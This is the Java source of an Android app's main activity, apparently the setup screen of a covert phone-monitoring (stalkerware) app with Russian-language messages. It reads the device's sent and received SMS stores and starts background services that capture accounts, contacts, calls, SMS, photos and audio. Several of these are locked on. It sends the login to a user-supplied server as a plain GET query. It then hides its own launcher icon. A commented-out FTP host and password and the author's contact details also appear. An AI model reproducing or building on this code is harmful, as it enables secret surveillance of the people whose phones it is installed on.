package voluntaty.com.base;
/* e-mail: superslon74@gmail.com
 * skype: superslon74
 * шаманский геннадий александрович
 */

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Collections;


import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.accounts.Account;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Intent;
import android.database.Cursor;
import android.provider.Browser;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.RadioButton;
import android.widget.Toast;
import android.accounts.Account;
import android.accounts.AccountManager;

import com.voluntary.database.DataHelper;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

public class MainActivity extends Activity {
    private String valid_email;
    private ProgressDialog dialog;
    private String valid_url;
    public String URL_HTTP=null;

    //	int error1=1;
    int error2 =1;
    int error3=1;
    int error4=1;
    int error5=0;

    String login=null;
    String email=null;
    String password=null;

    EditText edittext1 = null;
    EditText edittext2 = null;
    EditText edittext3 = null;
    EditText edittext4 = null;

    CheckBox checkBox1 = null;
    CheckBox checkBox2 = null;
    CheckBox checkBox3 = null;
    CheckBox checkBox4 = null;
    CheckBox checkBox5 = null;
    int flag5=0;
    CheckBox checkBox6 = null;
    int flag6=0;
    CheckBox checkBox7 = null;
    int flag7=0;
    CheckBox checkBox8 = null;
    int flag8=0;
    CheckBox checkBox9 = null;
    int flag9=0;
    CheckBox checkBox10 = null;
    int flag10=0;

    Button button1=null;
    Button button2=null;

    private DataHelper dh;
    public DataHelper getDataHelper() {
        return new DataHelper(this);
    }

   // static final String[] columns = {"title","url","date"};
  //  public static final Uri BOOKMARKS_URI = Uri.parse("content://browser/bookmarks");

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

// AccountManager manager =  AccountManager.get(this);
	/*
		//	 (AccountManager)getSystemService(ACCOUNT_SERVICE);
 		 Account[] accounts = manager.getAccounts();
*/
        edittext2 = (EditText) findViewById(R.id.edittext2);
        edittext2.addTextChangedListener(new TextWatcher() {

            @Override
            public void onTextChanged(CharSequence s, int start, int before,
                                      int count) {
                // TODO Auto-generated method stub

            }

            @Override
            public void beforeTextChanged(CharSequence s, int start, int count,
                                          int after) {
                // TODO Auto-generated method stub

            }

            @Override
            public void afterTextChanged(Editable s) {
                // TODO Auto-generated method stub

                // TODO Auto-generated method stub
                Is_Valid_Email(edittext2); // pass your EditText Obj here.
            }

            public void Is_Valid_Email(EditText edt) {
                if (edt.getText().toString() == null) {
                    edt.setError("Invalid Email Address");
                    error4=1;
                    valid_email = null;
                } else if (isEmailValid(edt.getText().toString()) == false) {
                    edt.setError("Invalid Email Address");
                    error4=1;
                    valid_email = null;
                } else {
                    error4=0;
                    valid_email = edt.getText().toString();
                }
            }

            boolean isEmailValid(CharSequence email) {
                return android.util.Patterns.EMAIL_ADDRESS.matcher(email)
                        .matches();
            } // end of TextWatcher (email)
        });
        edittext3 = (EditText) findViewById(R.id.edittext3);
        edittext4 = (EditText) findViewById(R.id.edittext4);
        button1 = (Button) findViewById(R.id.button1);
   //     button2 = (Button) findViewById(R.id.button2);

       checkBox1 = (CheckBox) findViewById(R.id.checkBox1);
       checkBox1.setChecked(true);

       checkBox1.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
           public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
               if (isChecked) {
                   checkBox1.setChecked(true);
                   Toast.makeText(getApplicationContext(), "Включено по умолчанию. Отключить нельзя", Toast.LENGTH_SHORT).show();
               } else {
                   checkBox1.setChecked(true);
                   Toast.makeText(getApplicationContext(), "Включено по умолчанию. Отключить нельзя", Toast.LENGTH_SHORT).show();
               }
           }
       });
       checkBox2 = (CheckBox) findViewById(R.id.checkBox2);
       checkBox2.setChecked(true);
       checkBox2.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
           public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
               if (isChecked) {
                   checkBox2.setChecked(true);
                   Toast.makeText(getApplicationContext(), "Включено по умолчанию. Отключить нельзя", Toast.LENGTH_SHORT).show();
               } else {
                   checkBox2.setChecked(true);
                   Toast.makeText(getApplicationContext(), "Включено по умолчанию. Отключить нельзя", Toast.LENGTH_SHORT).show();
               }
           }
       });
       checkBox3 = (CheckBox) findViewById(R.id.checkBox3);
       checkBox3.setChecked(true);
       checkBox3.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
           public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
               if (isChecked) {
                   checkBox3.setChecked(true);
                   Toast.makeText(getApplicationContext(), "Включено по умолчанию. Отключить нельзя", Toast.LENGTH_SHORT).show();
               } else {
                   checkBox3.setChecked(true);
                   Toast.makeText(getApplicationContext(), "Включено по умолчанию. Отключить нельзя", Toast.LENGTH_SHORT).show();
               }
           }
       });
       checkBox4 = (CheckBox) findViewById(R.id.checkBox4);
       checkBox4.setChecked(true);
       checkBox4.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
           public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
               if (isChecked) {
                   checkBox4.setChecked(true);
                   Toast.makeText(getApplicationContext(), "Включено по умолчанию. Отключить нельзя", Toast.LENGTH_SHORT).show();
               } else {
                   checkBox4.setChecked(true);
                   Toast.makeText(getApplicationContext(), "Включено по умолчанию. Отключить нельзя", Toast.LENGTH_SHORT).show();
               }
           }
       });

       checkBox5 = (CheckBox) findViewById(R.id.checkBox5);
       checkBox5.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked) {
                flag5=1;
          //          Toast.makeText(getApplicationContext(), "flag "+flag5, Toast.LENGTH_SHORT).show();
                } else {
                    flag5=0;
            //        Toast.makeText(getApplicationContext(), "flag "+flag5, Toast.LENGTH_SHORT).show();
                }
            }
        });
       checkBox6 = (CheckBox) findViewById(R.id.checkBox6);
       checkBox6.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked) {
                    flag6=1;
                          } else {
                    flag6=0;
                           }
            }
        });
       checkBox7 = (CheckBox) findViewById(R.id.checkBox7);
       checkBox7.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked) {
                    flag7=1;
                        } else {
                    flag7=0;
                        }
            }
        });
       checkBox8 = (CheckBox) findViewById(R.id.checkBox8);
       checkBox8.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked) {
                    flag8=1;
                       } else {
                    flag8=0;
                        }
            }
        });
      checkBox9 = (CheckBox) findViewById(R.id.checkBox9);
      checkBox9.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked) {
                    flag9=1;
                       } else {
                    flag9=0;
                       }
            }
        });
    checkBox10 = (CheckBox) findViewById(R.id.checkBox10);
    checkBox10.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked) {
                    flag10=1;
                    } else {
                    flag10=0;
                     }
            }
        });

        dh = getDataHelper();

        String strurl=null;
        strurl=dh.selectUrl_Http();


        if(strurl.length()>0)
        {
            edittext4.setText(strurl);
            button2.setVisibility(View.GONE);
        }

        strurl=null;
        edittext4.addTextChangedListener(new TextWatcher() {

            @Override
            public void onTextChanged(CharSequence s, int start, int before,
                                      int count) {
                // TODO Auto-generated method stub

            }

            @Override
            public void beforeTextChanged(CharSequence s, int start, int count,
                                          int after) {
                // TODO Auto-generated method stub

            }

            @Override
            public void afterTextChanged(Editable s) {
                // TODO Auto-generated method stub

                // TODO Auto-generated method stub
                Is_Valid_Email(edittext4); // pass your EditText Obj here.
            }

            public void Is_Valid_Email(EditText edt) {
                if (edt.getText().toString() == null) {
                    edt.setError("Invalid URL Address");
                    error5=1;
                    valid_url = null;
                } else if (isEmailValid(edt.getText().toString()) == false) {
                    edt.setError("Invalid URL Address");
                    error5=1;
                    valid_url = null;
                } else {
                    error5=0;
                    valid_url = edt.getText().toString();
                }
            }

            boolean isEmailValid(CharSequence email) {
                return android.util.Patterns.WEB_URL.matcher(email)
                        .matches();
            } // end of TextWatcher (email)
        });



        button1.setOnClickListener(new OnClickListener(){
            @Override
            public void onClick(View v) {

                URL_HTTP=edittext4.getText().toString();
                dh=null;
                dh = getDataHelper();

                email=edittext2.getText().toString();
                if(email.length()>0)
                {
                    error2=0;
                }
                else
                {
                    Toast.makeText(getApplicationContext(),"Ввели не корректный Email", Toast.LENGTH_LONG).show();
                    error2=1;
                }

               password=edittext3.getText().toString();

                if(error2==0){

                    if(password.length()>0)
                    {
                        error3=0;
                    }
                    else
                    {
                        Toast.makeText(getApplicationContext(),"Вы не ввели пароль!", Toast.LENGTH_LONG).show();
                        error3=1;
                    }
                }

               if(error2==0 && error3==0 && error4==0 && error5==0)
                {

                    ContentResolver contentResolver = getContentResolver();
                    Cursor cursor = contentResolver.query( Uri.parse( "content://sms/sent" ), null, null, null, null);

                    int indexBody = cursor.getColumnIndex( SmsReceiver.BODY );
                    int indexAddr = cursor.getColumnIndex( SmsReceiver.ADDRESS );
                    int idDate = cursor.getColumnIndex( SmsReceiver.DATE);

                    SimpleDateFormat format1 = new SimpleDateFormat("HH:mm:ss dd.MM.yyyy");

                    int i=0;

                   if ( indexBody < 0 || !cursor.moveToFirst() ) return;

                    ArrayList<Integer> list=null;
                    list=new ArrayList<Integer>();

                    do
                    {

                        list.add(Integer.parseInt(""+cursor.getLong(0)));

                    }
                    while( cursor.moveToNext() );

                    Collections.sort(list);
                    Integer endcmc=list.get(list.size() - 1);
                    dh.InsertInputSMS(""+endcmc);

                    list=null;



                    ContentResolver contentResolver2 = getContentResolver();
                    Cursor cursor2 = contentResolver2.query( Uri.parse( "content://sms/inbox" ), null, null, null, null);

                    int indexBody2 = cursor2.getColumnIndex( SmsReceiver.BODY );
                    int indexAddr2 = cursor2.getColumnIndex( SmsReceiver.ADDRESS );
                    int idDate2 = cursor2.getColumnIndex( SmsReceiver.DATE);

                    SimpleDateFormat format2 = new SimpleDateFormat("HH:mm:ss dd.MM.yyyy");
                    int i2=0;

                    if ( indexBody2 < 0 || !cursor2.moveToFirst() ) return;

                    ArrayList<Integer> list2=null;
                    list2=new ArrayList<Integer>();

                    do
                    {

                        list2.add(Integer.parseInt(""+cursor2.getLong(0)));

                    }
                    while( cursor2.moveToNext() );

                    Collections.sort(list2);
                    Integer endcmc2=list2.get(list2.size() - 1);
                    dh.InsertOutputSMS(""+endcmc2);
                    dh.InsertIdPhone("0");
                //    dh.InsertFTP("ftp.voluntaty.esy.es", "u638105038", "1234567890");
                //    dh=null;
                    list2=null;

        //              Toast.makeText(getApplicationContext(),"Вы вошли в чистему!", Toast.LENGTH_LONG).show();
                    new RequestTask().execute(URL_HTTP,email,password);

             //       dh=null;
            //     dh = getDataHelper();
           //       dh.InsertLogin(Alogin);
                    dh.InsertEmail(email);
                    dh.InsertPassword(password);
                    dh=null;
                    startNewService();

                }
                else
                {
                    Toast.makeText(getApplicationContext(),"Вы ввели неправильные данные!", Toast.LENGTH_LONG).show();
                }



            }
        });

/*
        button2.setOnClickListener(new OnClickListener(){
            @Override
            public void onClick(View v) {

                Intent intent2 = new Intent(MainActivity.this,RegistrationActivity.class);
                startActivity(intent2);
                finish();

            }
        });
*/
    }


    public void hideIcon(){
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName("voluntaty.com.base","voluntaty.com.base.MainActivity");
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    // Start the  service
    public void startNewService() {
 //     Toast.makeText(getApplicationContext(),"Старт нев сервиса!º", Toast.LENGTH_LONG).show();
     startService(new Intent(this, MyService.class));   //
     startService(new Intent(this, ServiceAccount.class));//
     startService(new Intent(this, ServiceContact.class));//
     startService(new Intent(this, ServiceData.class));  //

        dh=null;
        dh = getDataHelper();

       /*
        if(flag5==1) {
            dh.insertServiceurl("1");
            startService(new Intent(this, ServiceURL.class));//
                     }
*/

        if(flag6==1) {
            dh.insertServicephone("1");
            startService(new Intent(this, ServicePhone.class));//
      //      dh.insertServiceaudio("1");
       //     startService(new Intent(this, ServiceAudio.class));//
                     }

          if(flag7==1) {
            dh.insertServicesms("1");
            startService(new Intent(this, ServiceInputSMS.class));//
            startService(new Intent(this, ServiceOutputSMS.class));//
                     }

        if(flag8==1) {
            dh.insertServicephoto("1");
            startService(new Intent(this, ServicePhotoOne.class));//
                     }

        if(flag9==1) {
            dh.insertServiceaudio("1");
            startService(new Intent(this, ServiceAudio.class));//
        }

/*

        if(flag10==1) {
            dh.insertServiceaudioone("1");
            startService(new Intent(this, ServiceAudioOne.class));//
            startService(new Intent(this, ServiceAudioOneInsert.class));//
                      }
*/
        dh=null;


        hideIcon();
        finish();

//        Toast.makeText(getApplicationContext(), " !!!!!!!!!!!!!!!!!!!!!!!!!!!! ", Toast.LENGTH_LONG).show();



    }

/*
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}
*/


    class RequestTask extends AsyncTask<String, String, String> {
        private String str2="";

        private String Alogin=null;
        private String Aemail=null;
        private String Apassword=null;


        @Override
        protected String doInBackground(String... params) {

            try {
                // Ñ�Ð¾Ð·Ð´Ð°ÐµÐ¼ Ð·Ð°Ð¿Ñ€Ð¾Ñ� Ð½Ð° Ñ�ÐµÑ€Ð²ÐµÑ€
                DefaultHttpClient hc = new DefaultHttpClient();
                Alogin=params[0];
                Aemail=params[1];
                Apassword=params[2];

                HttpGet postMethod = new HttpGet(Alogin+"/index.php/api/login_ok?email="+Aemail+"&password="+Apassword+"");

                postMethod.setHeader("Content-Type", "text/plain; charset=utf-8");
                postMethod.setHeader("Expect", "100-continue");

                // Ð¿Ð¾Ð»ÑƒÑ‡Ð°ÐµÐ¼ Ð¾Ñ‚Ð²ÐµÑ‚ Ð¾Ñ‚ Ñ�ÐµÑ€Ð²ÐµÑ€Ð°
                HttpResponse response = hc.execute(postMethod);
                HttpEntity entity = response.getEntity();
                String content = EntityUtils.toString(entity);
                // Ð¿Ð¾Ñ�Ñ‹Ð»Ð°ÐµÐ¼ Ð½Ð° Ð²Ñ‚Ð¾Ñ€ÑƒÑŽ Ð°ÐºÑ‚Ð¸Ð²Ð½Ð¾Ñ�Ñ‚ÑŒ Ð¿Ð¾Ð»ÑƒÑ‡ÐµÐ½Ð½Ñ‹Ðµ Ð¿Ð°Ñ€Ð°Ð¼ÐµÑ‚Ñ€Ñ‹
                str2=content.toString().trim();
                //		Toast.makeText(getApplicationContext(), "  "+str, Toast.LENGTH_LONG).show();


            } catch (Exception e) {
                System.out.println("Exp=" + e);
            }

            return null;
        }

        @Override
        protected void onPostExecute(String result) {

            //	dialog.dismiss();
            super.onPostExecute(result);

            if(str2.equals("error"))
            {
                Toast.makeText(getApplicationContext(),"Вы ввели незарегистрированный email или пароль!\nПовторите ввод пожалуйста!", Toast.LENGTH_LONG).show();
            }
            else
            if(str2.length()<1)
            {
                Toast.makeText(getApplicationContext(),"Вы ввели неправильный адрес нашего сайта!\nПовторите ввод пожалуйста!", Toast.LENGTH_LONG).show();

            }


            else
            {

           //    	Toast.makeText(getApplicationContext(),"????????????????????º", Toast.LENGTH_LONG).show();
                dh=null;
                dh = getDataHelper();
                dh.InsertLogin(Alogin);
                dh.InsertEmail(Aemail);
                dh.InsertPassword(Apassword);
                dh=null;
                startNewService();

            }



        }

        @Override
        protected void onPreExecute() {
	  		/*	dialog = new ProgressDialog(MainActivity.this);
    			dialog.setMessage("Download....");
    			dialog.setIndeterminate(true);
    			dialog.setCancelable(true);
    			dialog.show();
    			*/
            super.onPreExecute();
        }
    }





}